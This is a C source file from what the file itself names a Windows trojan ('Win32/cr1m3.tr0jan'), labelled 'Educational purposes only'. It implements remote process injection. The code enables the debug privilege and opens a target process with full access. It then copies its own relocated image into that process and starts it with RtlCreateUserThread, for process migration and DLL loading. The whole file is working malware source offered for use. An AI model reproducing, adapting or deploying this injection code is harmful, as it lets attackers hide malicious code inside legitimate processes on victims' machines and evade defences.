/*
	Educational purposes only
	GPL LICENSE:  @Cr1m3 / JennyLab
	Win32/cr1m3.tr0jan
*/

#include "api.h"
#include "windows.h"
#include "process.h"
#include "misc.h"
#include "inject.h"
#include "rthreads.h"
#include "pe.h"


int __inject_migration(int pid,void *arguments) {
	__inject_thread(__rthreads_procMigrate, arguments,_lstrlenA(arguments),pid, 1);
	return 0;
}

int __inject_dll(int pid, const char *dll) {
	__inject_thread(__rthreads_load_dll, (void *)dll, _lstrlenA(dll), pid, 0);
}


int __inject_thread(void *thread_addr, void *arguments, int *arguments_len, int pid, int is_exit) {
	PIMAGE_NT_HEADERS pINH;
	PIMAGE_DATA_DIRECTORY pIDD;
	PIMAGE_BASE_RELOCATION pIBR;
	
	void *hModule;
	PVOID image,mem,StartAddress;
	HANDLE hProcess,hThread;
	DWORD i,count,nSizeOfImage;
	DWORD_PTR delta,OldDelta;
	unsigned short *list;
	PDWORD_PTR p;
	NTSTATUS thStatus;
	int bl;
	void *args;
	

	OBJECT_ATTRIBUTES oa;
	CLIENT_ID cid;

		 

	_RtlAdjustPrivilege(20,TRUE,FALSE,&bl);
	hModule=_GetModuleHandleA(NULL);
	pINH=_RtlImageNtHeader(hModule);

	
	nSizeOfImage=pINH->OptionalHeader.SizeOfImage;

	InitializeObjectAttributes(&oa,NULL,0,NULL,NULL);

	cid.UniqueProcess=(HANDLE)pid;
	cid.UniqueThread=0;


	_NtOpenProcess(&hProcess,PROCESS_ALL_ACCESS,&oa,&cid);
	mem=_VirtualAllocEx(hProcess,NULL,nSizeOfImage,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
	image=_VirtualAlloc(NULL,nSizeOfImage,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
	__memcpy(image,hModule,nSizeOfImage);

	pIDD=&pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	pIBR=(PIMAGE_BASE_RELOCATION)((LPBYTE)image+pIDD->VirtualAddress);

	delta=(DWORD_PTR)((LPBYTE)mem-pINH->OptionalHeader.ImageBase);
	OldDelta=(DWORD_PTR)((LPBYTE)hModule-pINH->OptionalHeader.ImageBase);

	while(pIBR->VirtualAddress!=0)
	{
		if(pIBR->SizeOfBlock>=sizeof(IMAGE_BASE_RELOCATION))
		{
			count=(pIBR->SizeOfBlock-sizeof(IMAGE_BASE_RELOCATION))/sizeof(WORD);
			list=(unsigned short *)((LPBYTE)pIBR+sizeof(IMAGE_BASE_RELOCATION));

			for(i=0;i<count;i++)
			{
				if(list[i]>0)
				{
					p=(PDWORD_PTR)((LPBYTE)image+(pIBR->VirtualAddress+(0x0fff & (list[i]))));

					*p-=OldDelta;
					*p+=delta;
				}
			}
		}

		pIBR=(PIMAGE_BASE_RELOCATION)((LPBYTE)pIBR+pIBR->SizeOfBlock);
	}

	
	_NtWriteVirtualMemory(hProcess,mem,image,nSizeOfImage,NULL);
	StartAddress=(PVOID)((LPBYTE)mem+(DWORD_PTR)(LPBYTE)thread_addr-(LPBYTE)hModule);
	
	if (arguments != NULL && arguments_len>0) {
		args = _VirtualAllocEx(hProcess, NULL, arguments_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		_NtWriteVirtualMemory(hProcess, args, arguments, arguments_len, NULL);
		thStatus = _RtlCreateUserThread(hProcess, NULL, FALSE, 0, 0, 0, StartAddress, args, &hThread, NULL);
	}
	else {
		thStatus = _RtlCreateUserThread(hProcess, NULL, FALSE, 0, 0, 0, StartAddress, mem, &hThread, NULL);
	}

	if (thStatus == (unsigned long)0xc0000022) {
		_MessageBoxA(0,"Error: Need privileges to migrate process","Akakak", 1); //Debug
	}

	if(is_exit!=0) {
		//_NtWaitForSingleObject(hThread,FALSE,NULL);
		//_NtClose(hThread);
		//_NtClose(hProcess);
		//_VirtualFree(image,0,MEM_RELEASE);
		_ExitProcess(0x00);
	}

	//_NtWaitForSingleObject(hThread,FALSE,NULL);
	//_NtClose(hThread);
	//_VirtualFreeEx(hProcess,mem,0,MEM_RELEASE);
	_NtClose(hProcess);
	_VirtualFree(image,0,MEM_RELEASE);

	if(hThread>0) //sin comprobar
		return 1;
	
	return 0;
}
